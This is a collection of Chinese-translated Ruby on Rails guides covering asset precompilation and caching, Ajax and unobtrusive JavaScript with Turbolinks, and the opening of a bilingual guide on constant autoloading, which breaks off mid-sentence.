在生产环境中，Sprockets 使用前文介绍的指纹机制。默认情况下，Rails 认为静态资源已经事先编译好了，直接由网页服务器伺服。

在预先编译的过程中，会根据文件的内容生成 MD5，写入硬盘时把 MD5 加到文件名中。Rails 帮助方法会使用加上指纹的文件名代替清单文件中使用的文件名。

例如：
<%= javascript_include_tag "application" %>
<%= stylesheet_link_tag "application" %>

生成的 HTML 如下：
<script src="/assets/application-908e25f4bf641868d8683022a5b62f54.js"></script>
<link href="/assets/application-4dd5b109ee3439da54f5bdfd78a80473.css" media="screen"
rel="stylesheet" />

注意，推出 Asset Pipeline 功能后不再使用 :cache 和 :concat 选项了，请从 javascript_include_tag 和 stylesheet_link_tag 标签上将其删除。

指纹由 config.assets.digest 初始化选项控制（生产环境默认为 true，其他环境为 false）。

一般情况下，请勿修改 config.assets.digest 的默认值。如果文件名中没有指纹，而且缓存报头的时间设置为很久以后，那么即使文件的内容变了，客户端也不会重新获取文件。
###  4.1 事先编译好静态资源

Rails 提供了一个 rake 任务用来编译清单文件中的静态资源和其他相关文件。

编译后的静态资源保存在 config.assets.prefix 选项指定的位置。默认是 /assets 文件夹。

部署时可以在服务器上执行这个任务，直接在服务器上编译静态资源。下一节会介绍如何在本地编译。

这个 rake 任务是：
$ RAILS_ENV=production bundle exec rake assets:precompile

Capistrano（v2.15.1 及以上版本）提供了一个配方，可在部署时编译静态资源。把下面这行加入 Capfile 文件即可：
load 'deploy/assets'

这个配方会把 config.assets.prefix 选项指定的文件夹链接到 shared/assets。如果 shared/assets 已经占用，就要修改部署任务。

在多次部署之间共用这个文件夹是十分重要的，这样只要缓存的页面可用，其中引用的编译后的静态资源就能正常使用。

默认编译的文件包括 application.js、application.css 以及 gem 中 app/assets 文件夹中的所有非 JS/CSS 文件（会自动加载所有图片）：
[ Proc.new { |path, fn| fn =~ /app\/assets/ && !%w(.js .css).include?(File.extname(path)) },
/application.(css|js)$/ ]

这个正则表达式表示最终要编译的文件。也就是说，JS/CSS 文件不包含在内。例如，因为 .coffee 和 .scss 文件能编译成 JS 和 CSS 文件，所以不在自动编译的范围内。

如果想编译其他清单，或者单独的样式表和 JavaScript，可以添加到 config/application.rb 文件中的 precompile 选项：
config.assets.precompile += ['admin.js', 'admin.css', 'swfObject.js']

或者可以按照下面的方式，设置编译所有静态资源：
# config/application.rb
config.assets.precompile << Proc.new do |path|
  if path =~ /\.(css|js)\z/
    full_path = Rails.application.assets.resolve(path).to_path
    app_assets_path = Rails.root.join('app', 'assets').to_path
    if full_path.starts_with? app_assets_path
      puts "including asset: " + full_path
      true
    else
      puts "excluding asset: " + full_path
      false
    end
  else
    false
  end
end

即便想添加 Sass 或 CoffeeScript 文件，也要把希望编译的文件名设为 .js 或 .css。

这个 rake 任务还会生成一个名为 manifest-md5hash.json 的文件，列出所有静态资源和对应的指纹。这样 Rails 帮助方法就不用再通过 Sprockets 获取指纹了。下面是一个 manifest-md5hash.json 文件内容示例：
{"files":{"application-723d1be6cc741a3aabb1cec24276d681.js":{"logical_path":"application.js","mtime":"2013-07-26T22:55:03-07:00","size":302506,
"digest":"723d1be6cc741a3aabb1cec24276d681"},"application-12b3c7dd74d2e9df37e7cbb1efa76a6d.css":{"logical_path":"application.css","mtime":"2013-07-26T22:54:54-07:00","size":1560,
"digest":"12b3c7dd74d2e9df37e7cbb1efa76a6d"},"application-1c5752789588ac18d7e1a50b1f0fd4c2.css":{"logical_path":"application.css","mtime":"2013-07-26T22:56:17-07:00","size":1591,
"digest":"1c5752789588ac18d7e1a50b1f0fd4c2"},"favicon-a9c641bf2b81f0476e876f7c5e375969.ico":{"logical_path":"favicon.ico","mtime":"2013-07-26T23:00:10-07:00","size":1406,
"digest":"a9c641bf2b81f0476e876f7c5e375969"},"my_image-231a680f23887d9dd70710ea5efd3c62.png":{"logical_path":"my_image.png","mtime":"2013-07-26T23:00:27-07:00","size":6646,
"digest":"231a680f23887d9dd70710ea5efd3c62"}},"assets"{"application.js":
"application-723d1be6cc741a3aabb1cec24276d681.js","application.css":
"application-1c5752789588ac18d7e1a50b1f0fd4c2.css",
"favicon.ico":"favicona9c641bf2b81f0476e876f7c5e375969.ico","my_image.png":
"my_image-231a680f23887d9dd70710ea5efd3c62.png"}}

manifest-md5hash.json 文件的存放位置是 config.assets.prefix 选项指定位置（默认为 /assets）的根目录。

在生产环境中，如果找不到编译好的文件，会抛出 Sprockets::Helpers::RailsHelper::AssetPaths::AssetNotPrecompiledError 异常，并提示找不到哪个文件。
####  4.1.1 把 Expires 报头设置为很久以后

编译好的静态资源存放在服务器的文件系统中，直接由网页服务器伺服。默认情况下，没有为这些文件设置一个很长的过期时间。为了能充分发挥指纹的作用，需要修改服务器的设置，添加相关的报头。

针对 Apache 的设置：
# The Expires* directives requires the Apache module
# `mod_expires` to be enabled.
<Location /assets/>
  # Use of ETag is discouraged when Last-Modified is present
  Header unset ETag FileETag None
  # RFC says only cache for 1 year
  ExpiresActive On ExpiresDefault "access plus 1 year"
</Location>

针对 Nginx 的设置：
location ~ ^/assets/ {
  expires 1y;
  add_header Cache-Control public;
 
  add_header ETag "";
  break;
}
####  4.1.2 GZip 压缩

Sprockets 预编译文件时还会创建静态资源的 gzip 版本（.gz）。网页服务器一般使用中等压缩比例，不过因为预编译只发生一次，所以 Sprockets 会使用最大的压缩比例，尽量减少传输的数据大小。网页服务器可以设置成直接从硬盘伺服压缩版文件，无需直接压缩文件本身。

在 Nginx 中启动 gzip_static 模块后就能自动实现这一功能：
location ~ ^/(assets)/  {
  root /path/to/public;
  gzip_static on; # to serve pre-gzipped version
  expires max;
  add_header Cache-Control public;
}

如果编译 Nginx 时加入了 gzip_static 模块，就能使用这个指令。Nginx 针对 Ubuntu/Debian 的安装包，以及 nginx-light 都会编译这个模块。否则就要手动编译：
./configure --with-http_gzip_static_module

如果编译支持 Phusion Passenger 的 Nginx，就必须加入这个命令行选项。

针对 Apache 的设置很复杂，请自行 Google。
###  4.2 在本地预编译

为什么要在本地预编译静态文件呢？原因如下：

    可能无权限访问生产环境服务器的文件系统；
    可能要部署到多个服务器，避免重复编译；
    可能会经常部署，但静态资源很少改动；

在本地预编译后，可以把编译好的文件纳入版本控制系统，再按照常规的方式部署。

不过有两点要注意：

    一定不能运行 Capistrano 部署任务来预编译静态资源；
    必须修改下面这个设置；

在 config/environments/development.rb 中加入下面这行代码：
config.assets.prefix = "/dev-assets"

修改 prefix 后，在开发环境中 Sprockets 会使用其他的 URL 伺服静态资源，把请求都交给 Sprockets 处理。但在生产环境中 prefix 仍是 /assets。如果没作上述修改，在生产环境中会从 /assets 伺服静态资源，除非再次编译，否则看不到文件的变化。

同时还要确保所需的压缩程序在生产环境中可用。

在本地预编译静态资源，这些文件就会出现在工作目录中，而且可以根据需要纳入版本控制系统。开发环境仍能按照预期正常运行。
###  4.3 实时编译

某些情况下可能需要实时编译，此时静态资源直接由 Sprockets 处理。

要想使用实时编译，要做如下设置：
config.assets.compile = true

初次请求时，Asset Pipeline 会编译静态资源，并缓存，这一过程前文已经提过了。引用文件时，会使用加上 MD5 哈希的文件名代替清单文件中的名字。

Sprockets 还会把 Cache-Control 报头设为 max-age=31536000。这个报头的意思是，服务器和客户端浏览器之间的缓存可以存储一年，以减少从服务器上获取静态资源的请求数量。静态资源的内容可能存在本地浏览器的缓存或者其他中间缓存中。

实时编译消耗的内存更多，比默认的编译方式性能更低，因此不推荐使用。

如果要把程序部署到没有安装 JavaScript 运行时的服务器，可以在 Gemfile 中加入：
group :production do
  gem 'therubyracer'
end
###  4.4 CDN

如果用 CDN 分发静态资源，要确保文件不会被缓存，因为缓存会导致问题。如果设置了 config.action_controller.perform_caching = true，Rack::Cache 会使用 Rails.cache 存储静态文件，很快缓存空间就会用完。

每种缓存的工作方式都不一样，所以要了解你所用 CDN 是如何处理缓存的，确保能和 Asset Pipeline 和谐相处。有时你会发现某些设置能导致诡异的表现，而有时又不会。例如，作为 HTTP 缓存使用时，Nginx 的默认设置就不会出现什么问题。
##  5 定制 Asset Pipeline
###  5.1 压缩 CSS

压缩 CSS 的方式之一是使用 YUI。YUI CSS compressor 提供了压缩功能。

下面这行设置会启用 YUI 压缩，在此之前要先安装 yui-compressor gem：
config.assets.css_compressor = :yui

如果安装了 sass-rails gem，还可以使用其他的方式压缩 CSS：
config.assets.css_compressor = :sass
###  5.2 压缩 JavaScript

压缩 JavaScript 的方式有：:closure，:uglifier 和 :yui。这三种方式分别需要安装 closure-compiler、uglifier 和 yui-compressor。

默认的 Gemfile 中使用的是 uglifier。这个 gem 使用 Ruby 包装了 UglifyJS（为 NodeJS 开发）。uglifier 可以删除空白和注释，缩短本地变量名，还会做些微小的优化，例如把 if...else 语句改写成三元操作符形式。

下面这行设置使用 uglifier 压缩 JavaScript：
config.assets.js_compressor = :uglifier

系统中要安装支持 ExecJS 的运行时才能使用 uglifier。Mac OS X 和 Windows 系统中已经安装了 JavaScript 运行时。 I> NOTE: config.assets.compress 初始化选项在 Rails 4 中不可用，即便设置了也没有效果。请分别使用 config.assets.css_compressor 和 config.assets.js_compressor 这两个选项设置 CSS 和 JavaScript 的压缩方式。
###  5.3 使用自己的压缩程序

设置压缩 CSS 和 JavaScript 所用压缩程序的选项还可接受对象，这个对象必须能响应 compress 方法。compress 方法只接受一个字符串参数，返回值也必须是字符串。
class Transformer
  def compress(string)
    do_something_returning_a_string(string)
  end
end

要想使用这个压缩程序，请在 application.rb 中做如下设置：
config.assets.css_compressor = Transformer.new
###  5.4 修改 assets 的路径

Sprockets 默认使用的公开路径是 /assets。

这个路径可以修改成其他值：
config.assets.prefix = "/some_other_path"

升级没使用 Asset Pipeline 的旧项目时，或者默认路径已有其他用途，或者希望指定一个新资源路径时，可以设置这个选项。
###  5.5 X-Sendfile 报头

X-Sendfile 报头的作用是让服务器忽略程序的响应，直接从硬盘上伺服指定的文件。默认情况下服务器不会发送这个报头，但在支持该报头的服务器上可以启用。启用后，会跳过响应直接由服务器伺服文件，速度更快。X-Sendfile 报头的用法参见 API 文档。

Apache 和 Nginx 都支持这个报头，可以在 config/environments/production.rb 中启用：
# config.action_dispatch.x_sendfile_header = "X-Sendfile" # for apache
# config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for nginx

如果升级现有程序，请把这两个设置写入 production.rb，以及其他类似生产环境的设置文件中。不能写入 application.rb。

详情参见生产环境所用服务器的文档： T> TIP: - Apache TIP: - Nginx
##  6 静态资源缓存的存储方式

在开发环境和生产环境中，Sprockets 使用 Rails 默认的存储方式缓存静态资源。可以使用 config.assets.cache_store 设置使用其他存储方式：
config.assets.cache_store = :memory_store

静态资源缓存可用的存储方式和程序的缓存存储一样。
config.assets.cache_store = :memory_store, { size: 32.megabytes }
##  7 在 gem 中使用静态资源

静态资源也可由 gem 提供。

为 Rails 提供标准 JavaScript 代码库的 jquery-rails gem 是个很好的例子。这个 gem 中有个引擎类，继承自 Rails::Engine。添加这层继承关系后，Rails 就知道这个 gem 中可能包含静态资源文件，会把这个引擎中的 app/assets、lib/assets 和 vendor/assets 三个文件夹加入 Sprockets 的搜索路径中。
##  8 把代码库或者 gem 变成预处理器

Sprockets 使用 Tilt 作为不同模板引擎的通用接口。在你自己的 gem 中也可实现 Tilt 的模板协议。一般情况下，需要继承 Tilt::Template 类，然后重新定义 prepare 方法（初始化模板），以及 evaluate 方法（返回处理后的内容）。原始数据存储在 data 中。详情参见 Tilt::Template 类的源码。
module BangBang
  class Template < ::Tilt::Template
    def prepare
      # Do any initialization here
    end
 
    # Adds a "!" to original template.
    def evaluate(scope, locals, &block)
      "#{data}!"
    end
  end
end

上述代码定义了 Template 类，然后还需要关联模板文件的扩展名：
Sprockets.register_engine '.bang', BangBang::Template
##  9 升级旧版本 Rails

从 Rails 3.0 或 Rails 2.x 升级，有一些问题要解决。首先，要把 public/ 文件夹中的文件移到新位置。不同类型文件的存放位置参见“静态资源的组织方式”一节。

其次，避免 JavaScript 文件重复出现。因为从 Rails 3.1 开始，jQuery 是默认的 JavaScript 库，因此不用把 jquery.js 复制到 app/assets 文件夹中。Rails 会自动加载 jQuery。

然后，更新各环境的设置文件，添加默认设置。

在 application.rb 中加入：
# Version of your assets, change this if you want to expire all your assets
config.assets.version = '1.0'
 
# Change the path that assets are served from config.assets.prefix = "/assets"

在 development.rb 中加入：
# Expands the lines which load the assets
config.assets.debug = true

在 production.rb 中加入：
# Choose the compressors to use (if any) config.assets.js_compressor  =
# :uglifier config.assets.css_compressor = :yui
 
# Don't fallback to assets pipeline if a precompiled asset is missed
config.assets.compile = false
 
# Generate digests for assets URLs. This is planned for deprecation.
config.assets.digest = true
 
# Precompile additional assets (application.js, application.css, and all
# non-JS/CSS are already added) config.assets.precompile += %w( search.js )

Rails 4 不会在 test.rb 中添加 Sprockets 的默认设置，所以要手动添加。测试环境中以前的默认设置是：config.assets.compile = true，config.assets.compress = false，config.assets.debug = false 和 config.assets.digest = false。

最后，还要在 Gemfile 中加入以下 gem：
gem 'sass-rails',   "~> 3.2.3"
gem 'coffee-rails', "~> 3.2.1"
gem 'uglifier'

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  在 Rails 中使用 JavaScript

本文介绍 Rails 内建对 Ajax 和 JavaScript 等的支持，使用这些功能可以轻易的开发强大的 Ajax 程序。

读完本文，你将学到：

    Ajax 基本知识；
    剥离式 JavaScript；
    如何使用 Rails 内建的帮助方法；
    如何在服务器端处理 Ajax；
    Turbolinks 简介；

Chapters

    Ajax 简介
    剥离式 JavaScript
    内建的帮助方法
        form_for
        form_tag
        link_to
        button_to
    服务器端处理
        一个简单的例子
    Turbolinks
        Turbolinks 的工作原理
        页面内容变更事件
    其他资源

##  1 Ajax 简介

在理解 Ajax 之前，要先知道网页浏览器常规的工作原理。

在浏览器的地址栏中输入 http://localhost:3000 后，浏览器（客户端）会向服务器发起一个请求。然后浏览器会处理响应，获取相关的资源文件，比如 JavaScript、样式表、图片，然后显示页面内容。点击链接后发生的事情也是如此：获取页面内容，获取资源文件，把全部内容放在一起，显示最终的网页。这个过程叫做“请求-响应循环”。

JavaScript 也可以向服务器发起请求，并处理响应。而且还能更新网页中的内容。因此，JavaScript 程序员可以编写只需更新部分内容的网页，而不用从服务器获取完整的页面数据。这是一种强大的技术，我们称之为 Ajax。

Rails 默认支持 CoffeeScript，后文所有的示例都用 CoffeeScript 编写。本文介绍的技术，在普通的 JavaScript 中也可使用。

例如，下面这段 CoffeeScript 代码使用 jQuery 发起一个 Ajax 请求：
$.ajax(url: "/test").done (html) ->
  $("#results").append html

这段代码从 /test 地址上获取数据，然后把结果附加到 div#results。

Rails 内建了很多使用这种技术开发程序的功能，基本上无需自己动手编写上述代码。后文介绍 Rails 如何为开发这种程序提供帮助，不过都构建在这种简单的技术之上。
##  2 剥离式 JavaScript

Rails 使用一种叫做“剥离式 JavaScript”（Unobtrusive JavaScript）的技术把 JavaScript 应用到 DOM 上。剥离式 JavaScript 是前端开发社区推荐使用的方法，但有些教程可能会使用其他方式。

下面是编写 JavaScript 最简单的方式，你可能见过，这叫做“行间 JavaScript”：
<a href="#" onclick="this.style.backgroundColor='#990000'">Paint it red</a>

点击链接后，链接的背景会变成红色。这种用法的问题是，如果点击链接后想执行大量代码怎么办？
<a href="#" onclick="this.style.backgroundColor='#009900';this.style.color='#FFFFFF';">Paint it green</a>

太别扭了，不是吗？我们可以把处理点击的代码定义成一个函数，用 CoffeeScript 编写如下：
paintIt = (element, backgroundColor, textColor) ->
  element.style.backgroundColor = backgroundColor
  if textColor?
    element.style.color = textColor

然后在页面中这么做：
<a href="#" onclick="paintIt(this, '#990000')">Paint it red</a>

这种方法好点儿，但是如果很多链接需要同样的效果该怎么办呢？
<a href="#" onclick="paintIt(this, '#990000')">Paint it red</a>
<a href="#" onclick="paintIt(this, '#009900', '#FFFFFF')">Paint it green</a>
<a href="#" onclick="paintIt(this, '#000099', '#FFFFFF')">Paint it blue</a>

非常不符合 DRY 原则。为了解决这个问题，我们可以使用“事件”。在链接上添加一个 data-* 属性，然后把处理程序绑定到拥有这个属性的点击事件上：
paintIt = (element, backgroundColor, textColor) ->
  element.style.backgroundColor = backgroundColor
  if textColor?
    element.style.color = textColor
 
$ ->
  $("a[data-background-color]").click ->
    backgroundColor = $(this).data("background-color")
    textColor = $(this).data("text-color")
    paintIt(this, backgroundColor, textColor)
<a href="#" data-background-color="#990000">Paint it red</a>
<a href="#" data-background-color="#009900" data-text-color="#FFFFFF">Paint it green</a>
<a href="#" data-background-color="#000099" data-text-color="#FFFFFF">Paint it blue</a>

我们把这种方法称为“剥离式 JavaScript”，因为 JavaScript 代码不再和 HTML 混用。我们把两中代码完全分开，这么做易于修改功能。我们可以轻易地把这种效果应用到其他链接上，只要添加相应的 data 属性就行。所有 JavaScript 代码都可以放在一个文件中，进行压缩，每个页面都使用这个 JavaScript 文件，因此只在第一次请求时加载，后续请求会直接从缓存中读取。“剥离式 JavaScript”带来的好处太多了。

Rails 团队极力推荐使用这种方式编写 CoffeeScript 和 JavaScript，而且你会发现很多代码库都沿用了这种方式。
##  3 内建的帮助方法

Rails 提供了很多视图帮助方法协助你生成 HTML，如果想在元素上实现 Ajax 效果也没问题。

因为使用的是剥离式 JavaScript，所以 Ajax 相关的帮助方法其实分成两部分，一部分是 JavaScript 代码，一部分是 Ruby 代码。

rails.js 提供 JavaScript 代码，常规的 Ruby 视图帮助方法用来生成 DOM 标签。rails.js 中的 CoffeeScript 会监听这些属性，执行相应的处理程序。
###  3.1 form_for

form_for 方法协助编写表单，可指定 :remote 选项，用法如下：
<%= form_for(@post, remote: true) do |f| %>
  ...
<% end %>

生成的 HTML 如下：
<form accept-charset="UTF-8" action="/posts" class="new_post" data-remote="true" id="new_post" method="post">
  ...
</form>

注意 data-remote="true" 属性，现在这个表单不会通过常规的提交按钮方式提交，而是通过 Ajax 提交。

或许你并不需要一个只能填写内容的表单，而是想在表单提交成功后做些事情。为此，我们要绑定到 ajax:success 事件上。处理表单提交失败的程序要绑定到 ajax:error 事件上。例如：
$(document).ready ->
  $("#new_post").on("ajax:success", (e, data, status, xhr) ->
    $("#new_post").append xhr.responseText
  ).on "ajax:error", (e, xhr, status, error) ->
    $("#new_post").append "<p>ERROR</p>"

显然你需要的功能比这要复杂，上面的例子只是个入门。关于事件的更多内容请阅读 jquery-ujs 的维基。
###  3.2 form_tag

form_tag 方法的功能和 form_for 类似，也可指定 :remote 选项，如下所示：
<%= form_tag('/posts', remote: true) do %>
  ...
<% end %>

生成的 HTML 如下：
<form accept-charset="UTF-8" action="/posts" data-remote="true" method="post">
  ...
</form>

其他用法都和 form_for 一样。详细介绍参见文档。
###  3.3 link_to

link_to 方法用来生成链接，可以指定 :remote，用法如下：
<%= link_to "a post", @post, remote: true %>

生成的 HTML 如下：
<a href="/posts/1" data-remote="true">a post</a>

绑定的 Ajax 事件和 form_for 方法一样。下面举个例子。加入有一个文章列表，我们想只点击一个链接就删除所有文章，视图代码如下：
<%= link_to "Delete post", @post, remote: true, method: :delete %>

CoffeeScript 代码如下：
$ ->
  $("a[data-remote]").on "ajax:success", (e, data, status, xhr) ->
    alert "The post was deleted."
###  3.4 button_to

button_to 方法用来生成按钮，可以指定 :remote 选项，用法如下：
<%= button_to "A post", @post, remote: true %>

生成的 HTML 如下：
<form action="/posts/1" class="button_to" data-remote="true" method="post">
  <div><input type="submit" value="A post"></div>
</form>

因为生成的就是一个表单，所以 form_for 的全部信息都适用于这里。
##  4 服务器端处理

Ajax 不仅需要编写客户端代码，服务器端也要做处理。Ajax 请求一般不返回 HTML，而是 JSON。下面详细介绍处理过程。
###  4.1 一个简单的例子

假设在网页中要显示一系列用户，还有一个新建用户的表单，控制器的 index 动作如下所示：
class UsersController < ApplicationController
  def index
    @users = User.all
    @user = User.new
  end
  # ...

index 动作的视图（app/views/users/index.html.erb）如下：
<b>Users</b>
 
<ul id="users">
<%= render @users %>
</ul>
 
<br>
 
<%= form_for(@user, remote: true) do |f| %>
  <%= f.label :name %><br>
  <%= f.text_field :name %>
  <%= f.submit %>
<% end %>

app/views/users/_user.html.erb 局部视图如下：
<li><%= user.name %></li>

index 动作的上部显示用户，下部显示新建用户的表单。

下部的表单会调用 UsersController 的 create 动作。因为表单的 remote 属性为 true，所以发往 UsersController 的是 Ajax 请求，使用 JavaScript 处理。要想处理这个请求，控制器的 create 动作应该这么写：
# app/controllers/users_controller.rb
# ......
def create
  @user = User.new(params[:user])
 
  respond_to do |format|
    if @user.save
      format.html { redirect_to @user, notice: 'User was successfully created.' }
      format.js   {}
      format.json { render json: @user, status: :created, location: @user }
    else
      format.html { render action: "new" }
      format.json { render json: @user.errors, status: :unprocessable_entity }
    end
  end
end

注意，在 respond_to 的代码块中使用了 format.js，这样控制器才能处理 Ajax 请求。然后还要新建 app/views/users/create.js.erb 视图文件，编写发送响应以及在客户端执行的 JavaScript 代码。
$("<%= escape_javascript(render @user) %>").appendTo("#users");
##  5 Turbolinks

Rails 4 提供了 Turbolinks gem，这个 gem 可用于大多数程序，加速页面渲染。
###  5.1 Turbolinks 的工作原理

Turbolinks 为页面中所有的 <a> 元素添加了一个点击事件处理程序。如果浏览器支持 PushState，Turbolinks 会发起 Ajax 请求，处理响应，然后使用响应主体替换原始页面的整个 <body> 元素。最后，使用 PushState 技术更改页面的 URL，让新页面可刷新，并且有个精美的 URL。

要想使用 Turbolinks，只需将其加入 Gemfile，然后在 app/assets/javascripts/application.js 中加入 //= require turbolinks 即可。

如果某个链接不想使用 Turbolinks，可以在链接中添加 data-no-turbolink 属性：
<a href="..." data-no-turbolink>No turbolinks here</a>.
###  5.2 页面内容变更事件

编写 CoffeeScript 代码时，经常需要在页面加载时做一些事情。在 jQuery 中，我们可以这么写：
$(document).ready ->
  alert "page has loaded!"

不过，因为 Turbolinks 改变了常规的页面加载流程，所以不会触发这个事件。如果编写了类似上面的代码，要将其修改为：
$(document).on "page:change", ->
  alert "page has loaded!"

其他可用事件等详细信息，请参阅 Turbolinks 的说明文件。
##  6 其他资源

下面列出一些链接，可以帮助你进一步学习：

    jquery-ujs 的维基
    其他介绍 jquery-ujs 的文章
    Rails 3 远程链接和表单权威指南
    Railscasts: Unobtrusive JavaScript
    Railscasts: Turbolinks

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Autoloading and Reloading Constants 自动加载、重载常量

This guide documents how constant autoloading and reloading works.
这个指南记述了常量怎么加载、重载。

After reading this guide, you will know:
读完这个指南，你将会知道：

    Key aspects of Ruby constants
    Ruby常量的关键方面
    What is autoload_paths
    什么是自动加载路径
    How constant autoloading works
    常量怎么自动加载
    What is require_dependency
    什么是请求依赖
    How constant reloading works
    常量怎么重载
    Solutions to common autoloading gotchas
    普通自动加载gotchas的解决方案

Chapters

    Introduction 介绍
    Constants Refresher 常量刷新器
        Nesting 嵌套
        Class and Module  Definitions are Constant Assignments 类和模型定义是常量赋值
        Constants are Stored in Modules 常量保存在模块中
        Resolution Algorithms 解析运算
    Vocabulary 词汇表
        Parent Namespaces 父层命名空间
        Loading Mechanism 加载机制
    Autoloading Availability 自动加载效应
    autoload_paths 自动加载路径
    Autoloading Algorithms  自动加载运算
        Relative References 相对引用
        Qualified References 限定引用
        Automatic Modules 自动模块
        Generic Procedure 一般过程
    require_dependency 请求依赖
    Constant Reloading 常量重载
    Module#autoload isn't Involved 自动加载不是调用
    Common Gotchas 普通收场
        Nesting and Qualified Constants 嵌套和限定常量
        Autoloading and STI 自动加载和单表继承
        Autoloading and require 自动加载和请求
        Autoloading and Initializers 自动加载和启动器
        require_dependency and Initializers 请求依赖和启动器
        When Constants aren't Missed 常量丢失时
        Autoloading within Singleton Classes 单例类内的自动加载
        Autoloading in BasicObject 基本对象内的自动加载

##  1 Introduction 介绍

Ruby on Rails allows applications to be written as if their code was preloaded.
Ruby on Rails 让程序写起来就像这些代码被预加载一样。

In a normal Ruby program classes need to load their dependencies:
普通Ruby程序的类需要加载依赖：
require 'application_controller'
require 'post'
 
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

Our Rubyist instinct quickly sees some redundancy in there: If classes were defined in files matching their name, couldn't their loading be automated somehow? We could save scanning the file for dependencies, which is brittle.
我们的Ruby程序员出于本能迅速地看到里面的累赘：如果类被定义在同名文件中，难道它们不能被自动加载吗？我们可以省掉扫描依赖文件这种麻烦的工作。

Moreover, Kernel#require loads files once, but development is much more smooth if code gets refreshed when it changes without restarting the server. It would be nice to be able to use Kernel#load in development, and Kernel#require in production.
还有， Kernel#require 只加载一次文件，但如果代码可以在自身改变的时候无需重启服务器就重新刷新，那开发过程会更顺畅。在开发环境中使用Kernel#load，到了生产环境中才使用Kernel#require ，应该会更好。

Indeed, those features are provided by Ruby on Rails, where we just write
确实，Ruby on Rails提供了那些特性，我们只需要这样写：
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

This guide documents how that works.
这个指南记录了这些功能是怎么运行的。
##  2 Constants Refresher 常量重刷新器

While constants are trivial in most programming languages, they are a rich topic in Ruby.
常量在大部分的编程语言中是地位低微的，但在Ruby中却话题多多。

It is beyond the scope of this guide to document Ruby constants, but we are nevertheless going to highlight a few key topics. Truly grasping the following sections is instrumental to understanding constant autoloading and reloading.
说明Ruby常量，这超出了本指南的范围，但这里有必要指出一些关键的地方。真正消化下面几个小节的内容，就可理解常量的自动加载和重载。
###  2.1 Nesting 嵌套

Class and module definitions can be nested to create namespaces:
类和模块定义可被嵌套，以创建命名空间。
module XML
  class SAXParser
    # (1)
  end
end

The nesting at any given place is the collection of enclosing nested class and module objects outwards. For example, in the previous example, the nesting at (1) is
任何地方的嵌套都是外向的嵌套了的类和模块的封装的对象的集合。比如前面的例子，位置(1)的嵌套是：
[XML::SAXParser, XML]

It is important to understand that the nesting is composed of class and module objects, it has nothing to do with the constants used to access them, and is also unrelated to their names.
嵌套是类和模块对象的组合，理解这点很重要。嵌套对用来进入其中的常量没有影响，也和常量的名称毫不相干。

For instance, while this definition is similar to the previous one:
比如，虽然这个定义很像前面的那个：
class XML::SAXParser
  # (2)
end

the nesting in (2) is different:
但嵌套(2)是不同的：
[XML::SAXParser]

XML does not belong to it.
XML不属于它。

We can see in this example that the name of a class or module that belongs to a certain nesting does not necessarily correlate with the namespaces at the spot.
在这个例子中，可以看到类或模块的名称属于特定嵌套，该嵌套不一定对应着该类或模块的命名空间。

Even more, they are totally independent, take for instance
甚至，它们是完全无关的，比如：
module X::Y
  module A::B
    # (3)
  end
end

The nesting in (3) consists of two module objects:
(3)的嵌套包含两个模块对象：
[A::B, X::Y]

So, it not only doesn't end in A, which does not even belong to the nesting, but it also contains X::Y, which is independent from A::B.
那么，它没有停留于A中，A甚至不属于该嵌套，但它包含了X::Y,而X::Y独立于A::B。

The nesting is an internal stack maintained by the interpreter, and it gets modified according to these rules:
嵌套是一个由解释器维护的内部堆栈，并根据下面这些规则进行修改：

    The class object following a class keyword gets pushed when its body is executed, and popped after it.
    主体执行时，跟在class关键字后面的类对象被推进堆栈，执行之后又从堆栈中被弹出。

    The module object following a module keyword gets pushed when its body is executed, and popped after it.
    主体执行时，跟在module关键字后面的模块对象被推进堆栈，执行之后又从堆栈中被弹出。

    A singleton class opened with class << object gets pushed, and popped later.
    用`类 << 对象`打开的单例类被推进堆栈，稍后被弹出。

    When any of the *_eval family of methods is called using a string argument, the singleton class of the receiver is pushed to the nesting of the eval'ed code.
    带着一个字符串参数调用任何`*_eval`系列的方法，接收者的单例类被推进执行eval的代码的嵌套中。

    The nesting at the top-level of code interpreted by Kernel#load is empty unless the load call receives a true value as second argument, in which case a newly created anonymous module is pushed by Ruby.
    由Kernel#load解释的顶级代码里的嵌套为空，除非load调用接收了一个真值作为第二参数，这种情况下由Ruby将新建的匿名类推入堆栈中。

It is interesting to observe that blocks do not modify the stack. In particular the blocks that may be passed to Class.new and Module.new do not get the class or module being defined pushed to their nesting. That's one of the differences between defining classes and modules in one way or another.
有意思的是代码块不会修改堆栈。特别是，可传给Class.new和Module.new的代码块不会将已经定义好的类或模块推入它们的嵌套中。这是这两种定义类和模块的方式的一个差别。

The nesting at any given place can be inspected with Module.nesting.
任何指定地方的嵌套可被视为模块的嵌套。
###  2.2 Class and Module Definitions are Constant Assignments  类和模块的定义是常量分配


Let's suppose the following snippet creates a class (rather than reopening it):
假设下面的片段创建了一个类（不是重新打开它）：
class C
end

Ruby creates a constant C in Object and stores in that constant a class object. The name of the class instance is "C", a string, named after the constant.
Ruby在Object里创建了一个常量C，并在该变量里存储了一个类对象。类名对象是“C”，一个字符串，在常量之后命名。

That is, 
就是说，
